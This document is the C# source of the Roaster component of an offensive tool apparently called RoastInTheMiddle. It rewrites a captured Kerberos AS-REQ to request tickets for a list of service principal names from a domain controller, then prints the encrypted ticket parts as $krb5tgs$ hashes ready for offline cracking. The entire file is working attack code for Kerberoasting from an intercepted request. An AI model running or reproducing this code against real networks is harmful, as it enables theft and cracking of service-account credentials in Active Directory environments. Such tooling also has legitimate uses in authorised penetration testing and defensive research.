using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Asn1;
using RoastInTheMiddle.Lib.Krb;

namespace RoastInTheMiddle.Lib
{
    public class Roaster
    {
        private static IPAddress domainControllerIP { get; set; }

        private static Random rnd = new Random();

        public static void RitMRoaster()
        {
            int r = rnd.Next(((List<IPAddress>)Program.shared["dcs"]).Count);
            domainControllerIP = ((List<IPAddress>)Program.shared["dcs"])[r];

            if (Program.verbose)
            {
                Console.WriteLine($"[*]   ROASTER: Using DC with IP {domainControllerIP} for roasting");
            }

            while (Program.isRunning && ((List<string>)Program.shared["spns"]).Count > 0)
            {
                if (Program.shared["captured"] != null)
                {
                    if (Program.verbose)
                    {
                        Console.WriteLine($"[*]   ROASTER: Starting roast");
                    }
                    for (int i = ((List<string>)Program.shared["spns"]).Count - 1; i >= 0; i--)
                    {
                        string spn = ((List<string>)Program.shared["spns"])[i];
                        AS_REQ asReq = (AS_REQ)Program.shared["captured"];
                        asReq.req_body.sname.name_string = new List<string>();

                        if (Program.verbose)
                        {
                            Console.WriteLine($"[*]   ROASTER: Rewriting sname to {spn}");
                        }

                        foreach (var part in spn.Split('/'))
                        {
                            asReq.req_body.sname.name_string.Add(part);
                        }

                        Interop.KERBEROS_ERROR response = Interop.KERBEROS_ERROR.UNKNOWN;
                        try
                        {
                            response = SendASREQ(asReq.Encode().Encode(), spn);
                        }
                        catch (Exception ex)
                        {
                            if (Program.verbose)
                            {
                                Console.WriteLine($"[!]   ROASTER: Unknown error occured: {ex.Message}\n{ex.StackTrace}\n\n");
                            }
                        }
                        if (response != Interop.KERBEROS_ERROR.UNKNOWN && response != Interop.KERBEROS_ERROR.KDC_ERR_NONE &&
                            response != Interop.KERBEROS_ERROR.KDC_ERR_S_PRINCIPAL_UNKNOWN && response != Interop.KERBEROS_ERROR.SUCCESS)
                        {
                            Console.WriteLine($"[!] Error other than S_PRINCIPAL_UNKNOWN returned ({response}), waiting for new AS-REQ");
                            Program.shared["captured"] = null;
                            break;
                        }
                        else if (response == Interop.KERBEROS_ERROR.SUCCESS || response == Interop.KERBEROS_ERROR.KDC_ERR_S_PRINCIPAL_UNKNOWN)
                        {
                            ((List<string>)Program.shared["spns"]).RemoveAt(i);
                        }
                    }
                }
                else
                {
                    Thread.Sleep(100);
                }
            }
            if (Program.isRunning)
            {
                Console.WriteLine("[*] Tried all provided SPNs, roaster exiting...");
                Program.isRunning = false;
            }
            else
            {
                Console.WriteLine("[*] User forced close, roaster exiting...");
            }
        }

        public static Interop.KERBEROS_ERROR SendASREQ(byte[] asReqBytes, string spn)
        {
            var ret = Interop.KERBEROS_ERROR.UNKNOWN;
            var ipEndPoint = new IPEndPoint(domainControllerIP, 88);
            var client = new TcpClient(ipEndPoint.AddressFamily);
            client.Client.Ttl = 128;
            client.Connect(ipEndPoint);

            if (Program.verbose)
            {
                Console.WriteLine($"[*]   ROASTER: Connected to {domainControllerIP}:88");
            }

            BinaryReader sr = new BinaryReader(client.GetStream());
            BinaryWriter sw = new BinaryWriter(client.GetStream());

            if (Program.verbose)
            {
                Console.WriteLine("[*] Sending modified AS-REQ to DC");
            }
            
            sw.Write(IPAddress.HostToNetworkOrder(asReqBytes.Length));
            sw.Write(asReqBytes);

            int recordMark = IPAddress.NetworkToHostOrder(sr.ReadInt32());
            int recordSize = recordMark & 0x7fffffff;

            if ((recordMark & 0x80000000) <= 0)
            {
                byte[] responseRecord = sr.ReadBytes(recordSize);

                try
                {
                    AsnElt responseAsn = AsnElt.Decode(responseRecord);

                    int responseTag = responseAsn.TagValue;
                    if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
                    {
                        AS_REP rep = new AS_REP(responseAsn);
                        ret = Interop.KERBEROS_ERROR.SUCCESS;

                        int encType = rep.ticket.enc_part.etype;
                        string sname = string.Join("/", rep.ticket.sname.name_string);
                        string cipherText = BitConverter.ToString(rep.ticket.enc_part.cipher).Replace("-", string.Empty);

                        string hash = "";
                        if ((encType == 18) || (encType == 17))
                        {
                            int checksumStart = cipherText.Length - 24;
                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, spn, rep.ticket.realm, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                        }
                        else
                        {
                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, "USER", rep.ticket.realm, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
                        }

                        Console.WriteLine($"[*] Hash for service {spn}:");
                        Console.WriteLine(hash);
                        Console.WriteLine($"{Environment.NewLine}");
                    }
                    else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
                    {
                        KRB_ERROR error = new KRB_ERROR(responseAsn);
                        ret = (Interop.KERBEROS_ERROR)error.error_code;
                        if (Program.verbose)
                        {
                            Console.WriteLine($"[*] Got back error: {(Interop.KERBEROS_ERROR)error.error_code}");
                        }
                    }
                }
                catch
                {
                    Console.WriteLine("[!] Response from DC couldn't be decoded");
                }
            }

            return ret;
        }
    }
}
